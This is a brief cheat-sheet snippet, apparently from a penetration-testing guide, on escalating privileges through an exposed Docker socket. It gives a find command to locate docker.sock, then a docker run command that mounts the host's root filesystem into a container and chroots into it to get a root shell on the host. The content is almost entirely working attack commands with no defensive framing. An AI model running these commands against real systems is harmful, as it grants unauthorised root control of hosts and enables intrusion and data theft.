### Search the socket

```bash
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

```